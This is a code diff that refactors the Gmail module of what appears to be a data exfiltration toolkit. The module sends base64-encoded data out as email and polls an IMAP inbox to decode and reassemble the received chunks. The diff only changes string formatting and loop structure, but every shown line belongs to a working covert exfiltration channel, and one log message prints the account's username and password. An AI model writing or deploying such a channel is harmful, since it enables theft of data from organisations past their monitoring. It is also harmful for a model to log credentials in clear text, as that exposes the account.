@@ -27,7 +27,8 @@ def send(data):
     msg['Subject'] = "det:toolkit"
     msg.attach(MIMEText(base64.b64encode(data)))
     app_exfiltrate.log_message(
-        'info', "[gmail] Sending {} bytes in mail".format(len(data)))
+        'info', f"[gmail] Sending {len(data)} bytes in mail"
+    )
     mail_server.sendmail(gmail_user, gmail_user, msg.as_string())
 
 
@@ -38,7 +39,9 @@ def listen():
         client_imap.login(gmail_user, gmail_pwd)
     except:
         app_exfiltrate.log_message(
-            'warning', "[gmail] Did not manage to authenticate with creds: {}:{}".format(gmail_user, gmail_pwd))
+            'warning',
+            f"[gmail] Did not manage to authenticate with creds: {gmail_user}:{gmail_pwd}",
+        )
         sys.exit(-1)
 
     while True:
@@ -54,16 +57,15 @@ def listen():
             email_message = email.message_from_string(raw_email_string)
             # this will loop through all the available multiparts in mail
             for part in email_message.walk():
-                if part.get_content_type() == "text/plain":  # ignore attachments/html
-                    body = part.get_payload(decode=True)
-                    data = body.split('\r\n')[0]
-                    # print(data)
-                    try:
-                        app_exfiltrate.retrieve_data(base64.b64decode(data))
-                    except Exception as e:
-                        print(e)
-                else:
+                if part.get_content_type() != "text/plain":
                     continue
+                body = part.get_payload(decode=True)
+                data = body.split('\r\n')[0]
+                # print(data)
+                try:
+                    app_exfiltrate.retrieve_data(base64.b64decode(data))
+                except Exception as e:
+                    print(e)
         time.sleep(2)
 
 
